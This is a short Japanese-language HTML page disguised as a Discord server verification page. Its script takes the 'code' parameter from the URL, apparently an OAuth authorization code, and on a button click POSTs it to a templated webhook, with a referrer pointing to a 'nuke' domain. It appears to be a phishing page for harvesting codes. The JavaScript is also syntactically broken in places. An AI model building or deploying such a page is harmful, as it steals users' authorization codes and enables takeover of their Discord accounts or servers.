<html>
  <head>
    <title>Discord技術綜合 認証ページ</title>
  </head>
  <body>
    <script>
      const query = window.location.search;
      const param = query.split("?")[1];
      const code = param.split("=")[1];

      function Button(){
        fetch(${{webhook}}, {
  "headers": {
    "accept": "*/*",
    "accept-language": "ja,en;q=0.9,en-GB;q=0.8,en-US;q=0.7",
    "content-type": "application/json",
    "sec-ch-ua": "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Microsoft Edge\";v=\"120\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "cross-site"
  },
  "referrer": "https://nuke.ctkpaarr.org/",
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": "{\"content\":\"# 認証コード\\n## "+code}",
  "method": "POST",
  "mode": "cors",
  "credentials": "omit"
});
      }
    </script>
    <h1>Discord技術綜合 認証ページ</h1>
    <p>下のボタンを押してください</p>
    <input type="button" value="クリック" onclick="Button();"/>
    <br>
    <br>
    <p>手順1終わりです</p>
    <p>認証チャンネルに戻って手順2に従ってください</p>
  </body>
</html>
